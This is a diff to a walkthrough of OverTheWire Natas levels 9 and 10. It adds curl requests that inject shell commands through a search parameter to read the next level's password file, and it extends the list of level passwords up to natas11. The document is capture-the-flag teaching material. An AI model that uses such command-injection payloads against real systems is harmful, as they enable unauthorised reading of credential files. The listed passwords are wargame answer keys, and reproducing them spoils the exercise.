@@ -349,7 +349,13 @@ I'm solving this level using browser input form
 Excuse me, I copied the following url from a GET request in Chrome Developer Tools _http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas\_webpass%2Fnatas10+%23&submit=Search_   
 
 ```bash
-curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --data "&submit=Submit+Query" http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --data "needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Submit+Query" http://natas9.natas.labs.overthewire.org/
+```
+
+or  
+
+```bash
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
 ```
 
 ## Level 10
@@ -389,6 +395,20 @@ if($key != "") {
 
 They now **filtered** special characters `;`, `|`, `&`  
 
+I'm solving this level using browser input form &rarr; input `.* /etc/natas_webpass/natas11 #`
+
+```bash
+curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu --data "needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Submit+Query" http://natas10.natas.labs.overthewire.org
+```
+
+or  
+
+```bash
+curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search
+```
+
+
+
 ## tldr; solution
 
 natas0  - `natas0`  
@@ -401,4 +421,5 @@ natas6  - `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
 natas7  - `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`  
 natas8  - `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`    
 natas9  - `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`  
-natas10 - `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`    
+natas10 - `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`  
+natas11 - `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`   
